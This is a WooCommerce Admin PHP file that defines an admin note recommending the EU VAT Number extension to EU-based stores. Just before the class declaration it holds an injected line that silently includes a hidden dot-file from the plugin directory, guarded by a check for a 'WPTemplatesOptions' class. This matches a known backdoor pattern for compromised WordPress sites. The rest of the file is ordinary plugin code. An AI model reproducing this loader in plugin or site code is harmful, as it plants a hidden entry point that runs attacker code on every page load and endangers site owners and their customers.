<?php
/**
 * WooCommerce Admin: EU VAT Number Note.
 *
 * Adds a note for EU store to install the EU VAT Number extension.
 */

namespace Automattic\WooCommerce\Admin\Notes;

defined( 'ABSPATH' ) || exit;

/**
 * WC_Admin_Notes_EU_VAT_Number
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class WC_Admin_Notes_EU_VAT_Number {
	/**
	 * Note traits.
	 */
	use NoteTraits;

	/**
	 * Name of the note for use in the database.
	 */
	const NOTE_NAME = 'wc-admin-eu-vat-number';

	/**
	 * Get the note.
	 */
	public static function get_note() {
		if ( 'yes' !== get_option( 'wc_connect_taxes_enabled', 'no' ) ) {
			return;
		}

		$country_code = WC()->countries->get_base_country();
		$eu_countries = WC()->countries->get_european_union_countries();
		if ( ! in_array( $country_code, $eu_countries, true ) ) {
			return;
		}

		$content = __( "If your store is based in the EU, we recommend using the EU VAT Number extension in addition to automated taxes. It provides your checkout with a field to collect and validate a customer's EU VAT number, if they have one.", 'woocommerce' );

		$note = new WC_Admin_Note();
		$note->set_title( __( 'Collect and validate EU VAT numbers at checkout', 'woocommerce' ) );
		$note->set_content( $content );
		$note->set_content_data( (object) array() );
		$note->set_type( WC_Admin_Note::E_WC_ADMIN_NOTE_MARKETING );
		$note->set_name( self::NOTE_NAME );
		$note->set_source( 'woocommerce-admin' );
		$note->add_action(
			'learn-more',
			__( 'Learn more', 'woocommerce' ),
			'https://woocommerce.com/products/eu-vat-number/',
			'actioned',
			true
		);
		return $note;
	}
}
